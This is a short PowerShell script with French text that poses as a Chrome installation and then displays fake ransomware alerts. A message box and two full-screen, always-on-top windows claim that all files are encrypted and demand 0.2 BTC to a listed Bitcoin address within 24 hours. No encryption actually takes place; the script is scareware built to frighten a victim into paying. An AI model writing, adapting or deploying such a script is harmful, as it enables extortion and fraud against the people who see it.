Add-Type -AssemblyName PresentationFramework

# Premier pop-up
[System.Windows.MessageBox]::Show('Installation en cours de Chrome...', 'Information', 'OK', 'Information')

# Deuxième pop-up combiné
[System.Windows.MessageBox]::Show(
    'Envoie-moi 0.2 BTC pour obtenir la clé de déchiffrement.\n\n' +
    'Mon adresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A\n\n' +
    'Vous avez 24 heures pour envoyer le paiement ou vos fichiers seront définitivement perdus.',
    'Avertissement critique',
    'OK', 
    'Warning'
)

# Grande fenêtre WPF pour "TOUS VOS FICHIERS SONT CHIFFRÉS"
Add-Type -TypeDefinition @"
using System.Windows;
using System.Windows.Controls;
public class WarningWindow {
    public static void ShowWindow(string title, string message, string bgColor, string fgColor, int width, int height, int fontSize) {
        Window window = new Window {
            Title = title,
            Width = width,
            Height = height,
            WindowStartupLocation = WindowStartupLocation.CenterScreen,
            Topmost = true,
            Background = (System.Windows.Media.Brush)new System.Windows.Media.BrushConverter().ConvertFromString(bgColor),
            Foreground = (System.Windows.Media.Brush)new System.Windows.Media.BrushConverter().ConvertFromString(fgColor),
            Content = new TextBlock {
                Text = message,
                FontSize = fontSize,
                TextWrapping = TextWrapping.Wrap,
                HorizontalAlignment = HorizontalAlignment.Center,
                VerticalAlignment = VerticalAlignment.Center,
                TextAlignment = TextAlignment.Center
            }
        };
        window.ShowDialog();
    }
}
"@ -Language CSharp

# Fenêtre 1 : Alerte "TOUS VOS FICHIERS SONT CHIFFRÉS !"
[WarningWindow]::ShowWindow(
    "ALERTE SECURITE", 
    "TOUS VOS FICHIERS SONT CHIFFRÉS !\n\nPayez pour les récupérer immédiatement !", 
    "Red", 
    "White", 
    800, 
    400, 
    48
)

# Fenêtre 2 : Alerte avec "DÉLAI RESTANT"
[WarningWindow]::ShowWindow(
    "DÉLAI RESTANT : 24 HEURES", 
    "PAYEZ MAINTENANT OU PERDEZ VOS DONNÉES À JAMAIS !\n\nAdresse BTC : 1JHCFfjvY7g5Q8QvJ3Qs8Z2jWb3vzr7f7A", 
    "Black", 
    "Red", 
    900, 
    500, 
    42
)
